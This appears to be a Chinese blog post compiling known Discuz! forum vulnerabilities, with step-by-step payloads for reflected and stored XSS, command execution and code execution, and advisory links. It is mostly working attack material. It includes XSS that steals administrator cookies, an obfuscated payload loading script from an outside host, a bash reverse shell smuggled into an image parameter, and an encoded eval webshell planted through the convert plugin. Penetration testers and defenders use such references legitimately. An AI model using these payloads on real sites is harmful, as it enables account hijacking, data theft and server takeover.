<h3 id="演示1：Discuz-7-2-反射型xss漏洞1"><a href="#演示1：Discuz-7-2-反射型xss漏洞1" class="headerlink" title="演示1：Discuz 7.2 反射型xss漏洞1"></a>演示1：Discuz 7.2 反射型xss漏洞1</h3><p>访问以下链接即可触发XSS：</p>
<p><a target="_blank" rel="noopener" href="http://ip/admincp.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/admincp.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a><br><a target="_blank" rel="noopener" href="http://ip/logging.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/logging.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a><br><a target="_blank" rel="noopener" href="http://ip/api/uchome.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/api/uchome.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.bubuko.com/infodetail-2094064.html">http://www.bubuko.com/infodetail-2094064.html</a></p>
<h3 id="演示2：Discuz-7-2-反射型xss漏洞2"><a href="#演示2：Discuz-7-2-反射型xss漏洞2" class="headerlink" title="演示2：Discuz 7.2 反射型xss漏洞2"></a>演示2：Discuz 7.2 反射型xss漏洞2</h3><p>访问如下链接即可触发</p>
<p><a target="_blank" rel="noopener" href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert(document.domain)-">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert%28document.domain%29-</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d57b73372148026c6028251ddc12ef7c.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-89252">https://www.seebug.org/vuldb/ssvid-89252</a></p>
<h3 id="演示3：Disucz-X3-2-多处反射型XSS漏洞"><a href="#演示3：Disucz-X3-2-多处反射型XSS漏洞" class="headerlink" title="演示3：Disucz X3.2 多处反射型XSS漏洞"></a>演示3：Disucz X3.2 多处反射型XSS漏洞</h3><p><a target="_blank" rel="noopener" href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
<p>以上链接的referer参数存在XSS漏洞，访问如上链接可查看HTML</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b9188996d2c703cc4eef76d4c40540dc.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9477cbf714cb2776e884a98262745922.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93719">https://www.seebug.org/vuldb/ssvid-93719</a></p>
<h2 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h2><p><strong>漏洞描述：</strong>攻击者可指定任意用户的会话session等会话校验字符串。攻击者可以轻松指定任意用户的session，待诱导用户登录之后，直接使用此session登录用户账号。多常见于此类字段存在于url登录地址中的情况。涉及URL如下：</p>
<p>##直播功能-&gt;演示1</p>
<p>##发帖/回复-编辑功能-&gt;演示2</p>
<p>##链接格子插件-&gt;演示3</p>
<p>##添加链接处（如发帖时可添加链接）-&gt;演示4</p>
<p>##后台禁言处-&gt;演示5</p>
<p>##上传附件处-&gt;演示6</p>
<p>##抢楼-奖励楼层处-&gt;演示7</p>
<p>##添加视频处-&gt;演示8</p>
<p>##发表日志处-&gt;演示9</p>
<p>##头像设置处-&gt;演示10</p>
<p>##个人签名处-&gt;演示11</p>
<p>##discuz7.x发帖回帖处-&gt;演示12</p>
<p>## trade.php-&gt;演示13</p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有13个功能或插件存在反射型XSS</p>
<h3 id="演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）"><a href="#演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）" class="headerlink" title="演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）"></a>演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）</h3><p>discuz3.0-3.2有个功能叫直播的。实习版主就能开启哈~<br>接着咱们就用admin帐号先把一个帖子弄成直播！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/58408e5396ca116e16614a9b1601e894.png" class>

<p>先把payload进行base16编码（如果不拦截，直接上原始payload）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/281d7fb89a658cff5a42b07217026d24.png" class>

<p>在直播发帖处进行发表</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5cc92bcad46824d7e41f06de5116aeb4.png" class>

<p>弹窗~</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1f16610a47e54f4cc664d28a18009681.png" class>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/33389.html">https://www.secpulse.com/archives/33389.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93716">https://www.seebug.org/vuldb/ssvid-93716</a></p>
<h3 id="演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过："><a href="#演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过：" class="headerlink" title="演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过："></a>演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过：</h3><p>此处演示绕过：在发帖或回复处添加“[email]2”onmouseover=”alert(2)[/email]”</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/2192718863ecc37e99869241f451f578.png" class>

<p>然后对帖子或者评论进行编辑时，与页面进行一定交互时即可触发 XSS：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/933da97c673d2b6b86e5a9beb7a82ebf.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ac627b1480f42a10d09faa7840daa07c.png" class>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="http://0day5.com/archives/3323/">http://0day5.com/archives/3323/</a></p>
<p>20150609补丁绕过：<a target="_blank" rel="noopener" href="http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/">http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/</a></p>
<p><a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=139851">https://bugs.shuimugan.com/bug/view?bug_no=139851</a></p>
<h3 id="演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞"><a href="#演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞" class="headerlink" title="演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞"></a>演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞</h3><p>在论坛自助购买广告位处，在“文字内容中”填写”&gt;&lt;img/src=1/&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0a1d28d7afb2ed43aef928c51971b5b6.png" class>

<p>在管理后台-应用-自助广告位可发现弹出窗口</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9272dfb415c08bb154c70dad8f506bb3.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-90006">https://www.seebug.org/vuldb/ssvid-90006</a></p>
<h3 id="演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员"><a href="#演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员" class="headerlink" title="演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员"></a>演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员</h3><p>在添加链接处，如添加友链或发帖内容填写友链处。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/841d5c2797f52d13ec241c760a420b06.png" class>

<p>添加xss代码</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/674987aa9589354b68b27a937e94b9e3.png" class>

<p>等管理员审核的时候获取到cookie</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/284a885c94357c2a6a88414d3296b872.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93713">https://www.seebug.org/vuldb/ssvid-93713</a></p>
<h3 id="演示5：Discuz-X2-5后台禁言xss"><a href="#演示5：Discuz-X2-5后台禁言xss" class="headerlink" title="演示5：Discuz! X2.5后台禁言xss"></a>演示5：Discuz! X2.5后台禁言xss</h3><p>在论坛首页管理 禁止用户那 输入你能管理的用户名称 然后选择禁言 理由那插入payload</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9ed50fd51c80d44b30d1b346fd2cef76.png" class>

<p>漏洞证明</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b32950a12dcb7fb8188dc1dc80af34c6.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93645">https://www.seebug.org/vuldb/ssvid-93645</a></p>
<h3 id="演示6：Discuz-附件解析漏洞导致XSS"><a href="#演示6：Discuz-附件解析漏洞导致XSS" class="headerlink" title="演示6：Discuz!附件解析漏洞导致XSS"></a>演示6：Discuz!附件解析漏洞导致XSS</h3><p>先新建一个php文件，写入XSS代码：&lt;img src=1 onerror=alert(document.cookie)&gt;</p>
<p>然后保存再将它的后缀名字改成.rar，然后上传附件。点击附件下载，提示即将下：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/68a8742a947fff02992951aa0cac2316.png" class>

<p>右键审查元素得到一个类似下面这样附件的地址（这里不是直接在帖子中得到地址而是通过下载提示之后）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3ad2d67da7ddda9a1debbcf85297ab27.png" class>

<p>在地址后添加一段：-request-文件名.php.html，如下：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8a939e7d6a3e0c9ac4914baea21cd08c.png" class>

<p>当作html执行，XSS代码被触发！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f98ab82c6ad15ee808a9ca7d8c1e3901.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93631">https://www.seebug.org/vuldb/ssvid-93631</a></p>
<h3 id="演示7：DiscuzX3-1-X3-X2-5-X2-抢楼存在存储型XSS"><a href="#演示7：DiscuzX3-1-X3-X2-5-X2-抢楼存在存储型XSS" class="headerlink" title="演示7：DiscuzX3.1/X3/X2.5/X2 抢楼存在存储型XSS"></a>演示7：DiscuzX3.1/X3/X2.5/X2 抢楼存在存储型XSS</h3><p>在抢楼-奖励楼层处添加payload</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/bacf4d3c7ada780dd70336aa196f1f6e.png" class>

<p>完成后触发xss</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a2f59445cab6af38a983487f3dc6f5f2.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93620">https://www.seebug.org/vuldb/ssvid-93620</a></p>
<h3 id="演示8：Ucenter-Home-2-0及以下存储型XSS"><a href="#演示8：Ucenter-Home-2-0及以下存储型XSS" class="headerlink" title="演示8：Ucenter Home 2.0及以下存储型XSS"></a>演示8：Ucenter Home 2.0及以下存储型XSS</h3><p>在插入视频处，如发帖处的插入视频，设置如下payload: [flash]http://“<br>onmouseover=’document.body.innerHTML=String.fromCharCode(60,105,102,114,97,109,101,47,111,110,108,111,97,100,61,39,106,97,118,97,115,99,114,105,112,116,58,119,114,105,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,51,50,44,49,49,53,44,49,49,52,44,57,57,44,54,49,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,49,49,54,44,49,48,57,44,49,50,48,44,49,48,55,44,52,54,44,49,49,49,44,49,49,52,44,49,48,51,44,52,55,44,49,49,51,44,52,54,44,49,48,54,44,49,49,53,44,54,50,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,41,39,62)’[/flash]</p>
<p>完成后弹窗</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d2b13fa78846d28742ffa82191b67c04.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93654">https://www.seebug.org/vuldb/ssvid-93654</a></p>
<h3 id="演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞"><a href="#演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞" class="headerlink" title="演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞"></a>演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞</h3><p>在发表日志内容处添加XSS代码</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/458c96f71cf70ad50ab21933475bd6f5.png" class>

<p>完成后触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/62054f437d9ba49e73fd2678d1fdb77e.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93665">https://www.seebug.org/vuldb/ssvid-93665</a></p>
<h3 id="演示10：Discuz-4-0-头像设置处可以持久型脚本"><a href="#演示10：Discuz-4-0-头像设置处可以持久型脚本" class="headerlink" title="演示10：Discuz 4.0 头像设置处可以持久型脚本"></a>演示10：Discuz 4.0 头像设置处可以持久型脚本</h3><p>头像设置处，先选一个系统自带头像，提交，抓包。<br>将头像地址“customavatars/190.jpg”替换为xss脚本“javascript:alert(/大家新年快乐啊！/)”（此处会过滤&lt;,”,’），post提交后，触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1638f9cf5984633cb55be99ae37d7eaf.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93680">https://www.seebug.org/vuldb/ssvid-93680</a></p>
<h3 id="演示11：Discuz-所有版本永久型跨站漏洞"><a href="#演示11：Discuz-所有版本永久型跨站漏洞" class="headerlink" title="演示11：Discuz! 所有版本永久型跨站漏洞"></a>演示11：Discuz! 所有版本永久型跨站漏洞</h3><p>个人中心里的“个人签名”没有对恶意代码进行检测，在 Discuz! 及 img<br>代码禁用的情况下仍可写入恶意代码，Discuz! 会保存并执行该代码，形成永久型跨站。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-19342">https://www.seebug.org/vuldb/ssvid-19342</a></p>
<h3 id="演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在发帖或回帖处设置内容为“[audio]javascript:alert(document.cookie)//.wav[/audio]”，触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/79652e8ad632488906454b64322138ad.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/665eee7215f51a735d8959e74ed6878f.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
<h3 id="演示13：Discuz-trade-php-数据库’注射’-bug"><a href="#演示13：Discuz-trade-php-数据库’注射’-bug" class="headerlink" title="演示13：Discuz! trade.php 数据库’注射’ bug"></a>演示13：Discuz! trade.php 数据库’注射’ bug</h3><p>问题在trade,php中，找到类似于如下请求包，设置目录以及message参数中的payload（注意：一定是199个A）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/919047631672b116dcfdc4d117dda1ac.png" class>

<p>之后会执行XSS。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://h2016.blog.163.com/blog/static/100863425200810413817385/">http://h2016.blog.163.com/blog/static/100863425200810413817385/</a></p>
<h2 id="命令-代码执行漏洞"><a href="#命令-代码执行漏洞" class="headerlink" title="命令/代码执行漏洞"></a>命令/代码执行漏洞</h2><p><strong>漏洞描述：</strong>Discuz组件中有部分功能代码未对用户的输入进行很好的过滤，导致可植入系统命令或代码到服务器执行。涉及URL如下：</p>
<p>##管理后台-站长-数据库-数据库备份-&gt;演示1</p>
<p>##文件上传-预览-&gt;演示2</p>
<p>##Discuz6.x，7.x任何帖子有表情的地方-&gt;演示3</p>
<p>##convert插件-/config.inc.php-&gt;演示4</p>
<p><a target="_blank" rel="noopener" href="http://ip/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://ip/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
<p>##发表日志-添加网络图片处-&gt;演示5</p>
<p>##管理后台-全局-网站第三方统计代码-&gt;演示6</p>
<p>## misc.php -&gt;演示7</p>
<p>[<a target="_blank" rel="noopener" href="http://ip/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D(http://ip/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb)%5D=">http://ip/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b](http://ip/misc.php?action=imme_binding&amp;response%5bresult%5d=aa:b&amp;scriptlang%5baa%5d%5bb)]=</a></p>
<p>## admin\runwizard.inc.php-&gt;演示8</p>
<p><a target="_blank" rel="noopener" href="http://ip/bbs/admincp.php?action=runwizard&amp;step=3">http://ip/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
<p>##管理后台-站长-Ucenter设置-设置UcenterIP处-&gt;演示9</p>
<p>##管理后台-已启用插件-接口信息-App key处-&gt;演示10</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729"><a href="#演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729" class="headerlink" title="演示1：Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)"></a>演示1：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97510">Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)</a></h3><p>在管理后台-站长-数据库-备份中选择好要备份的表、数据和备份的方式</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0127f7d9b485fd26befaa068cc25e541.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5630b2c719e066f4a53d2f8b0f04345a.png" class>

<p>提交，使用burpsuit抓包，修改customtables[] = pre_common_admincp_cmenu”&gt;aaa;<br>echo ‘&lt;?php phpinfo(); ?&gt;‘ &gt; phpinfo.php #</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4834856099a86c61967e688328376b56.png" class>

<p>成功</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/075d029eef73169b67670ec70ba0fa82.png" class>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97510">https://www.seebug.org/vuldb/ssvid-97510</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/158270">https://www.anquanke.com/post/id/158270</a></p>
<h3 id="演示2：Discuz-X2-5-source-class-class-image-php-命令执行漏洞"><a href="#演示2：Discuz-X2-5-source-class-class-image-php-命令执行漏洞" class="headerlink" title="演示2：Discuz X2.5 /source/class/class_image.php 命令执行漏洞"></a>演示2：Discuz X2.5 /source/class/class_image.php 命令执行漏洞</h3><p>在发贴上传附件，上传图片附近，预览抓包修改为以下链接</p>
<p>GET/dzx25/forum.php?mod=image&amp;aid=1&amp;size=|bash%20i%20&gt;%26%20/dev/tcp/127.0.0.1/8888%200&gt;%261|x300&amp;key=68b54146d9d1bfb2ebb38f44f2427454&amp;nocache=yes&amp;type=1&amp;ramdom=xfie9</p>
<p>使用nc命令监听本地8888端口，成功获取到反弹的shell</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1b5db641a4ce869bce72c5e2b8b24531.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="http://0day5.com/archives/2846/">http://0day5.com/archives/2846/</a></p>
<h3 id="演示3：Discuz-6-x-7-x-include-discuzcode-func-php-代码执行漏洞"><a href="#演示3：Discuz-6-x-7-x-include-discuzcode-func-php-代码执行漏洞" class="headerlink" title="演示3：Discuz 6.x/7.x /include/discuzcode.func.php 代码执行漏洞"></a>演示3：Discuz 6.x/7.x /include/discuzcode.func.php 代码执行漏洞</h3><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a target="_blank" rel="noopener" href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page=1">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
<p>1GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/44db579c2e436453ee8e8ff8091ce1bf.png" class>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/4199432.html">https://www.cnblogs.com/milantgh/p/4199432.html</a></p>
<p><a target="_blank" rel="noopener" href="http://sh4d0w.lofter.com/post/1cb55ec4_2d35857">http://sh4d0w.lofter.com/post/1cb55ec4_2d35857</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></p>
<p><a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=80723">https://bugs.shuimugan.com/bug/view?bug_no=80723</a></p>
<h3 id="演示4：Discuz-x3-1-convert插件代码执行漏洞"><a href="#演示4：Discuz-x3-1-convert插件代码执行漏洞" class="headerlink" title="演示4：Discuz! x3.1 convert插件代码执行漏洞"></a>演示4：Discuz! x3.1 convert插件代码执行漏洞</h3><p>在该链接下：<a target="_blank" rel="noopener" href="http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
<p>发送如下POST请求包(设置newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa)。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/45da2778bfe46d99a095dfbaf2374c4a.png" class>

<p>菜刀连接地址<a target="_blank" rel="noopener" href="http://www.test.ichunqiu/utility/convert/data/config.inc.php">www.test.ichunqiu/utility/convert/data/config.inc.php</a> 密码c</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a88ca737f9449c8b2dbb711f9ab4e966.png" class>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-1909-1-1.html">https://bbs.ichunqiu.com/thread-1909-1-1.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.webshell.cc/4664.html">https://www.webshell.cc/4664.html</a></p>
<h3 id="演示5：Discuz-X2-5-远程代码执行漏洞"><a href="#演示5：Discuz-X2-5-远程代码执行漏洞" class="headerlink" title="演示5：Discuz! X2.5 远程代码执行漏洞"></a>演示5：Discuz! X2.5 远程代码执行漏洞</h3><p>a.注册任意账户。</p>
<p>b.登陆用户，发表blog日志（注意是日志）。</p>
